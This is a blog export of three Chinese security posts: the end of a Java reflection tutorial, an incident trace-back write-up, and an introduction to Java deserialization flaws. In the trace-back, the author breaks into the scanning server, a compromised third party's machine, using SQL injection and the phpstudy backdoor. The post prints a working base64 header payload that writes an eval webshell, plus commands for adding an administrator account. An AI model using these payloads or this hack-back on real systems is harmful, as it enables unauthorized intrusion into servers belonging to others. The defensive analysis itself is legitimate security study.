class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reflect</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//三种获取类的方式</span></span><br><span class="line">        <span class="comment">//1、使用反射.forName(&quot;完整类名&quot;)获取类</span></span><br><span class="line">        Class people1=Class.forName(<span class="string">&quot;com.javaweb.reflect.people&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;使用.forName(\&quot;完整类名\&quot;)获取类 的类名&quot;</span>+people1.getName());</span><br><span class="line">        <span class="comment">//2、使用反射 对象.getClass()获取类</span></span><br><span class="line">        people pl=<span class="keyword">new</span> <span class="title class_">people</span>();</span><br><span class="line">        Class people2=pl.getClass();</span><br><span class="line">        System.out.println(<span class="string">&quot;使用对象.getClass()获取类 的类名&quot;</span>+people2.getName());</span><br><span class="line">        <span class="comment">//3、使用反射 任何类型.class获取类</span></span><br><span class="line">        Class people3=String.class;</span><br><span class="line">        System.out.println(<span class="string">&quot;使用任何类型.class获取类 的类名&quot;</span>+people3.getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//进行反射类实例化</span></span><br><span class="line">        Object obj=people1.newInstance();</span><br><span class="line">        <span class="comment">//System.out.println(obj);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//Field访问成员变量</span></span><br><span class="line">        <span class="comment">//反射获取类变量</span></span><br><span class="line">        Field A=people1.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="comment">//由于people类属性值为private私有的，需要setAccessible(true)打破封装，访问私有变量。</span></span><br><span class="line">        A.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//反射设置类中的变量值</span></span><br><span class="line">        A.set(obj,<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        <span class="comment">//输出该obj对象中变量的变量值</span></span><br><span class="line">        System.out.println(A.get(obj));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Method访问成员setinfo()方法并传参设置变量值</span></span><br><span class="line">        Method mt=people1.getDeclaredMethod(<span class="string">&quot;setinfo&quot;</span>, String.class, String.class, <span class="type">int</span>.class);</span><br><span class="line">        <span class="comment">//Method调用方法传参</span></span><br><span class="line">        Object mtobj=mt.invoke(obj,<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;13011111111&quot;</span>,<span class="number">18</span>);</span><br><span class="line">        <span class="comment">//Method访问成员show()方法</span></span><br><span class="line">        Method mt2=people1.getDeclaredMethod(<span class="string">&quot;show&quot;</span>);</span><br><span class="line">        Object mtobj2=mt2.invoke(obj);</span><br><span class="line">        System.out.println(mtobj2);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;----------分割线--------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Constructor访问成员构造方法</span></span><br><span class="line">        <span class="comment">//方法一、通过newInstance()调用无参构造方法</span></span><br><span class="line">        Object obj2=people1.newInstance();</span><br><span class="line">        System.out.println(<span class="string">&quot; 方法一：直接通过newInstance()调用无参构造方法&quot;</span>);</span><br><span class="line">        <span class="comment">//方法二、通过getDeclaredConstructor()调用带参构造方法,再调用newIntance()传参构造方法</span></span><br><span class="line">        Constructor ct=people1.getDeclaredConstructor(String.class, String.class, <span class="type">int</span>.class);</span><br><span class="line">        Object obj3=ct.newInstance(<span class="string">&quot;张四&quot;</span>,<span class="string">&quot;13022222222&quot;</span>,<span class="number">19</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot; 方法二：通过getDeclaredConstructor()调用带参构造方法,再调用newIntance()传参构造方法&quot;</span>);</span><br><span class="line">        <span class="comment">//方法三、通过getDeclaredConstructor()调用无参构造方法</span></span><br><span class="line">        Constructor ct2=people1.getDeclaredConstructor();</span><br><span class="line">        Object obj4=ct2.newInstance();</span><br><span class="line">        System.out.println(<span class="string">&quot; 方法三：通过getDeclaredConstructor()调用无参构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Constructor实现截图：</p><p><img src="/posts/7a787d86/jc-7.png" title="Constructor实现"></p><h1 id="0x02、思考"><a href="#0x02、思考" class="headerlink" title="0x02、思考"></a>0x02、思考</h1><p>Java反射是真的累啊看下来，为了实现动态对类的操作，绕了很大一圈，多出来很多代码去实现这个功能，但确实使用反射很大程度降低了代码之间的依赖性，实现动态加载。<br>java反射核心想法就是：突破常规访问限制，就是为了动态访问类。<br>导致的安全问题也是因为突破常规访问限制，利用反射去访问对象以及篡改变量值包括一些私有属性的变量。</p><h1 id="0x03、参考链接"><a href="#0x03、参考链接" class="headerlink" title="0x03、参考链接"></a>0x03、参考链接</h1><p><a href="http://c.biancheng.net/view/6907.html">http://c.biancheng.net/view/6907.html</a><br><a href="https://blog.csdn.net/qq_44715943/article/details/120587716">https://blog.csdn.net/qq_44715943/article/details/120587716</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次普通的攻击溯源排查</title>
      <link href="/posts/777da932.html"/>
      <url>/posts/777da932.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h2><p>一次恶意扫描触发的告警，溯源排查攻击源IP，简单记一下这次的溯源排查流程。</p><h2 id="0x01、告警"><a href="#0x01、告警" class="headerlink" title="0x01、告警"></a>0x01、告警</h2><p>可以看是<font color="red">同一时间</font>的告警，受害IP为该C段下的三台业务服务器，触发的三条告警，可直接判断为<font color="red">恶意扫描</font>。</p><p><img src="/posts/777da932/gj-1.png" title="告警"> </p><p>查看攻击流量http报文，可看到phpstudy的后门利用payload，排除误报。</p><p><img src="/posts/777da932/gj-2.png" title="告警报文"><br><img src="/posts/777da932/gj-3.png" title="告警payload"> </p><h2 id="0x02、溯源排查"><a href="#0x02、溯源排查" class="headerlink" title="0x02、溯源排查"></a>0x02、溯源排查</h2><p>针对攻击源IP，进行常规溯源流程（威胁情报、域名反查、IP端口开放情况、可利用的漏洞等）</p><h3 id="攻击源IP情况："><a href="#攻击源IP情况：" class="headerlink" title="攻击源IP情况："></a>攻击源IP情况：</h3><p>直接丢ti、微步、360威胁情报同理，取有用信息。</p><p><img src="/posts/777da932/pc-1.png" title="威胁情报"> </p><p>攻击源ip：绵阳阿里云<br>有用信息就只有反查域名，注册过m.xxx.cn，还有一些其他域名，查了没啥有用的。<br>查看m.xxx.cn域名信息，该域名为一家装饰公司备案的，也有备案号。</p><p><img src="/posts/777da932/pc-2.png" title="域名查询"> </p><p>同时ping该域名也是正常解析到攻击源IP上的，说明当前域名与攻击IP是绑定匹配的，时效期内。</p><p><img src="/posts/777da932/pc-3.png" title="域名IP绑定"> </p><p>同时威胁情报也能看到对应开放的端口，但大部分时效性不强，可以结合fofa查看或者自己扫描攻击源IP开放的端口。<br>扫描查看到攻击源IP开放了80、3389、8085等端口。<br>访问web页面，访问跳转&#x2F;index2.php页面，标题为屠龙之怒，与该公司名称xx装饰集团四川有限公司业务不符，疑为该公司网站被挂黑链，服务器被当作跳板对外发出恶意扫描。</p><p><img src="/posts/777da932/pc-4.png" title="web应用"> </p><p>攻击源IP简述:<br>1、绵阳阿里云服务器<br>2、注册域名为m.xxx.cn，为某装修公司，域名与IP绑定匹配。<br>3、web应用跳转游戏，疑似被挂黑页，疑为肉鸡。</p><h3 id="攻击源IP反制："><a href="#攻击源IP反制：" class="headerlink" title="攻击源IP反制："></a>攻击源IP反制：</h3><p>一来就看游戏入口去了，一个游戏页面，简单抓了包</p><p><img src="/posts/777da932/fz-1.jpg" title="登录"> </p><p>存在用户，但没啥关系，存在sql注入，查看了库，只有test库（&#x2F;不对劲，交互连接的库名不是这个），但不能查询内容。</p><p><img src="/posts/777da932/fz-2.png" title="sql注入"> </p><p>–os-shell一把嗦。</p><p><img src="/posts/777da932/fz-3.jpg" title="sql注入"> </p><p>权限不够，权限不足，–file-read啥的也是没权限直接过。<br>于此同时目录也早扫完了，查看了一下，看到早就已经被挂了马了，肉鸡没跑了。</p><p><img src="/posts/777da932/fz-4.png" title="目录扫描"> </p><p>查看了下漏扫结果，存在phpstudy后门，才反应过来本来就是肉鸡，一个劲对外扫phpstudy后门，黑页的游戏也是phpstudy部署的，本身就有后门</p><p><img src="/posts/777da932/fz-5.png" title="漏洞扫描"> </p><p>顺其自然通过Phpstudy后门写文件获取shell</p><p><img src="/posts/777da932/fz-6.png" title="payload"> </p><p>手工直接请求头添加下面payload即可，同时删除原本的Accept-Encoding改成下面的，&#x2F;&#x2F;开始忘删了导致没生效，蠢死。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-Charset: c3lzdGVtKCdlY2hvIF48P3BocCBAZXZhbCgkX1BPU1RbInVwZGF0ZSJdKT9ePj5DOlxMVF9TZXJ2ZXJccGhwU3R1ZHlcV1dXXHVwZGF0ZTF0ZXN0LnBocCcpOw==</span><br></pre></td></tr></table></figure><p><img src="/posts/777da932/fz-7.png" title="发送payload"> </p><h3 id="攻击源IP服务器分析："><a href="#攻击源IP服务器分析：" class="headerlink" title="攻击源IP服务器分析："></a>攻击源IP服务器分析：</h3><p>其中查看数据发现系统存在可见内最早的webshell为2019-10-15日,文件名为test.php(不确定是否为文件真正上传建立的日期)</p><p><img src="/posts/777da932/sy-1.png" title="webshell"> </p><p>以及2022-10-10 01:28创建的webshell，文件名称为phpshell.php，同时期上传的cs马</p><p><img src="/posts/777da932/sy-2.png" title="webshell"> </p><p>但该攻击者未进行其他的相关操作，仅获取服务器权限后看了一下，未发现其他操作。<br>于此同时，发现被添加的影子账户loxxxxo$,并且在这个影子账户的桌面上传了phpstudy的批量扫描后门利用工具，以及一些扫描记录和扫描的目标网段</p><p><img src="/posts/777da932/sy-3.png" title="记录"><br><img src="/posts/777da932/sy-4.png" title="记录"> </p><p>通过创建影子账户登录服务器，本身就开了3389，就不用再开启端口了</p><p><img src="/posts/777da932/sy-5.png" title="创建账户"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user xxx /add  //添加管理员账户</span><br><span class="line">net localgroup administrators xxx /add  //将添加的管理员账户加入管理员组</span><br></pre></td></tr></table></figure><p>利用工具的一些扫描记录</p><p><img src="/posts/777da932/sy-6.png" title="利用工具"> </p><p>同时该影子用户还上传了一些黑灰产软件，运行挂起获取收益</p><p><img src="/posts/777da932/yz-1.png" title="挂起收益"> </p><p>一个月内获得的积分收益</p><p><img src="/posts/777da932/yz-2.png" title="挂起收益"> </p><h3 id="攻击源IP-loxxxxo影子用户分析："><a href="#攻击源IP-loxxxxo影子用户分析：" class="headerlink" title="攻击源IP loxxxxo影子用户分析："></a>攻击源IP loxxxxo影子用户分析：</h3><p>通过查看服务器端口连接情况发现与该服务器3389远程连接有一个IP 175.xxx.xxx.138（上海 腾讯云），极大可能也为肉鸡。</p><p><img src="/posts/777da932/yz-3.png" title="连接情况"> </p><p>同时查看当前服务器在线用户，该影子用户loxxxxo$处于连接在线状态，也就是说上述的175.xxx.xxx.138的腾讯云服务器即为该影子用户的远程连接主机。</p><p><img src="/posts/777da932/yz-4.png" title="在线情况"> </p><p>通过信息查看loxxxxo$用户创建时间为2022年9月20日（不排除为后续修改密码后的时间）（因此说明10号上传的webshell的攻击者与该用户不为同一人）。</p><p><img src="/posts/777da932/yz-5.png" title="创建情况"> </p><p><strong>简述该用户信息：</strong><br>1、影子用户：loxxxxo$<br>2、远程连接主机：175.xxx.xxx.138（上海 腾讯云）<br>3、9月20日甚至跟早入侵该攻击源IP并作为跳板对外扫描Phpstudy后门，同时利用入侵主机部署黑灰产软件获益。<br>4、其中一个黑灰产软件使用的他的会员号：AG-xxx</p><h3 id="后续思路："><a href="#后续思路：" class="headerlink" title="后续思路："></a>后续思路：</h3><p>1、针对175.xxx.xxx.138攻击主机，简单看了一下，开了80端口 但没什么应用部署，也没查到相关威胁情报信息，极大可能也为跳板机。<br>2、针对黑灰产软件上的会员号信息，涉及到网站jingxxx.taxxx.com，意思得获取这个网站权限在查相关用户信息，工作量较大，仅思考了下。</p><h3 id="总结事件线："><a href="#总结事件线：" class="headerlink" title="总结事件线："></a>总结事件线：</h3><p>该源IP被很早入侵并使用phpstudy部署了几套web游戏系统——&gt;真实攻击者持有IP175.xx.xx.138通过phpstudy后门扫到该服务器存在后门，并通过后门获取服务器权限，同时创建了影子账户loxxxxo$——&gt;该用户上传黑灰产软件运行挂机收益，同时定期使用Phpstudy批量扫描工具对全网扫描——&gt;10月10日凌晨扫描至单位业务系统服务器触发告警。</p><h2 id="0x03、总结"><a href="#0x03、总结" class="headerlink" title="0x03、总结"></a>0x03、总结</h2><p>本次溯源并未实际溯源到真实用户，排查过程也很仓储，也没去找最开始的入侵痕迹，简单排查告警触发后的溯源分析过程，了解攻击者的入侵思路和入侵意图，再进一步的话可能从后续思路再入手，但可能短时间获取不到有用信息，就先这样记录下吧。</p>]]></content>
      
      
      <categories>
          
          <category> 实战记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实战记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-初识反序列化</title>
      <link href="/posts/45180cd1.html"/>
      <url>/posts/45180cd1.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h2><p>学习java基础知识记录，方便查阅。</p><h2 id="0x01、反序列化是什么？有什么用？"><a href="#0x01、反序列化是什么？有什么用？" class="headerlink" title="0x01、反序列化是什么？有什么用？"></a>0x01、反序列化是什么？有什么用？</h2><blockquote><p>  Java 提供了一种对象序列化的机制，该机制中，一个对象可以被表示为一个字节序列，该字节序列包括该对象的数据、有关对象的类型的信息和存储在对象中数据的类型。将序列化对象写入文件之后，可以从文件中读取出来，并且对它进行反序列化，也就是说，对象的类型信息、对象的数据，还有对象中的数据类型可以用来在内存中新建对象。 </p></blockquote><p>java序列化会更有利于传输，它的速度会更快，并且也会更安全，被调用方序列化，调用方反序列化即能够得到传输之前的最原始的java对象，常常用来做不同进程之间的对象传输。能够更加便于储存，不论是存储成文件又或者是存储成数据库都是可以的，存储成文件，下次要用可以直接反序列拿到对象。</p><h2 id="0x02、反序列化如何实现"><a href="#0x02、反序列化如何实现" class="headerlink" title="0x02、反序列化如何实现"></a>0x02、反序列化如何实现</h2><p>实现方法：通过该对象所处类实现<font color="red">Serializable</font>接口，调用<font color="red">writeObject()</font>方法序列化、<font color="red">readObject()</font>方法反序列化分别对对象进行数据转换的写入和读取。</p><p><font color="red">writeObject()</font>序列化：将java对象转换成java字节序列、json、xml等数据格式的过程，利用ObjectOutputStream流接口把对象序列化数据写入文件。<br><font color="red">readObject()</font>反序列化：将java字节序列、json、xml等数据格式还原成java对象的过程，利用ObjectInputStream流接口把序列化文件读取并恢复成对象。</p><p>一个类的对象要想序列化成功，必须满足两个条件：<br>1、该类必须实现 java.io.Serializable 接口。<br>2、该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。<br>注：不可序列化的属性：带static修饰（静态变量）和transient修饰（临时变量）的属性，对于transient属性序列化机制会跳过而不会将其写入文件，但在读取时也不可恢复，该属性值保持默认初始化值。</p><h2 id="0x03、反序列化代码实现demo"><a href="#0x03、反序列化代码实现demo" class="headerlink" title="0x03、反序列化代码实现demo"></a>0x03、反序列化代码实现demo</h2><p>新建java项目，创建pack包，新建java程序，不赘述了。</p><h3 id="类对象："><a href="#类对象：" class="headerlink" title="类对象："></a>类对象：</h3><p>创建people类，并实现<font color="red">Serializable</font>接口</p><p><img src="/posts/45180cd1/classpeople.png" title="people类"></p><h3 id="序列化："><a href="#序列化：" class="headerlink" title="序列化："></a>序列化：</h3><p>创建demo类，实现对people类对象调用并实例化输出</p><p><img src="/posts/45180cd1/ser.png" title="序列化过程"></p><p>查看输出txt为序列化数据</p><p><img src="/posts/45180cd1/sertxt.png" title="序列化结果"></p><p>生成的数据文件为16进制，乱码显示以  sr开头</p><blockquote><p>  java原生序列化的16进制是以aced00057372开头、base64编码是以rO0ABXNy开头</p></blockquote><h3 id="反序列化："><a href="#反序列化：" class="headerlink" title="反序列化："></a>反序列化：</h3><p>创建unser类，实现对序列化文件进行反序列化读取并输出。</p><p><img src="/posts/45180cd1/unser.png" title="序列化结果"></p><p>以上过程为一个简单的序列化与反序列化的过程。</p><h2 id="0x04、安全成因"><a href="#0x04、安全成因" class="headerlink" title="0x04、安全成因"></a>0x04、安全成因</h2><p>与其说是漏洞成因，不妨说是安全成因，单从上述的反序列化过程似乎没发现怎么变成常谈的java反序列化漏洞，既然是反序列化漏洞，那重点就在反序列化上，即readObject()方法;<br>学习总结的漏洞成因要素：<br>1、readObject()方法被重写，当实现Servializable类并重写了readObject()方法，系统执行反序列化时会调用重写的readObject()方法。<br>2、重写的readObject()方法含有危险方法，如方法中直接执行Runtime.getRuntime().exec();<br>3、重写的readObject()方法中存在调用其它类的可控变量并执行危险函数。<br>4、套娃3步骤，调用其它类中变量再次调用另外一个类中的方法。#可以理解为常说的gadget链，通俗点说就是漏洞利用链。</p><h3 id="案例demo-1"><a href="#案例demo-1" class="headerlink" title="案例demo-1"></a>案例demo-1</h3><p><strong>重写readObject方法并直接执行危险函数</strong><br>实现Servializable类的实例类重写了readObject()方法，readObject()方法执行了危险函数。</p><p><img src="/posts/45180cd1/anli-1.png" title="readObject方法重写"></p><p>这是执行反序列化步骤 发现危险函数被执行</p><p><img src="/posts/45180cd1/anli-2.png" title="危险函数被执行"></p><p>通过调试可以认证这点<br>在调用readObject()方法处下断点</p><p><img src="/posts/45180cd1/anli-3.png" title="调试"></p><p>可看到调用重写的readObject()方法</p><p><img src="/posts/45180cd1/anli-3-1.png" title="调试"></p><h3 id="案例demo-2"><a href="#案例demo-2" class="headerlink" title="案例demo-2"></a>案例demo-2</h3><p><strong>重写readObject方法，方法中调用了其他类中的危险方法</strong><br>新建立一个exec类，其中exec类使用了危险函数。</p><p><img src="/posts/45180cd1/anli-4-1.png" title="exec类"></p><p>重写readObject方法，方法中调用了exec类对象。</p><p><img src="/posts/45180cd1/anli-4-2.png" title="readObject方法重写"></p><p>同样运行反序列化操作，同样实现了反序列化漏洞，执行了命令</p><p><img src="/posts/45180cd1/anli-4-3.png" title="readObject方法重写"></p><p>上诉案例仅提供漏洞造成原理思路，实际漏洞调用链远比其复杂例如cc链。</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
